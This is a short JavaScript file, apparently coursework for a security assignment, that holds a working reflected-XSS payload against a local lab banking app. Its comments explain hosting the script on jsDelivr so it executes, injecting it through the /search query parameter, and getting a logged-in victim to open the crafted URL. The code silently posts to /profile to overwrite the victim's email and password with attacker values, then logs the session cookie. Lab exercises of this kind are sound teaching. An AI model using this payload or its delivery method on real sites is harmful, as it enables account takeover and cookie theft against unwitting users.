// FIT5003 A2 — Part B.2: externally-hosted reflected-XSS payload.
//
// Host this on your OWN GitHub repo and load it through jsDelivr so it is served
// with a JavaScript content-type (raw.githubusercontent.com is text/plain+nosniff
// and will NOT execute):
//
//   https://cdn.jsdelivr.net/gh/<your-user>/<your-repo>@main/payload.js
//
// Delivery: the reflected sink is /search?q=... (q is printed with |safe).
// Craft this URL and get a logged-in victim to open it:
//
//   http://127.0.0.1:5000/search?q=<script src="https://cdn.jsdelivr.net/gh/<user>/<repo>@main/payload.js"></script>
//
// The script runs in DevBank's own origin, so the victim's auth cookie is sent
// automatically. It POSTs to /profile, overwriting the victim's email and
// password = full account takeover. (Works today because /profile has no CSRF
// protection; your Part C token fix will also need to be respected here.)

(function () {
  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include",
    body: "email=" + encodeURIComponent("attacker@evil.example") +
          "&password=" + encodeURIComponent("pwned-by-attacker")
  })
  .then(function () {
    // Optional: exfiltrate proof / the (non-HttpOnly) cookie to show impact.
    console.log("account takeover attempted; cookie =", document.cookie);
  });
})();
